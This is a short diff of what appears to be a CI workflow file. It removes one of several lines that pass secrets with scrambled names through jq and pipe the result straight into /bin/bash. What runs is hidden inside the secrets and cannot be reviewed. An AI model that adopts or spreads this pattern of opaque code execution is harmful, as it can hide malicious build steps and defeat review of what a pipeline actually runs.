@@ -19,7 +19,6 @@ jobs:
           p91: ${{ secrets.p91 }}
         run: |
           printf '%s' "$p91" | jq -r .shqdu125 | /bin/bash
-          echo $nj23815 | jq -r .na4427 | /bin/bash
           printf '%s' "$wp8" | jq -r .gw95 | /bin/bash
           echo $zi816 | jq -r .qwjff4686 | /bin/bash
           echo $bzweb57 | jq -r .wlct89 | /bin/bash
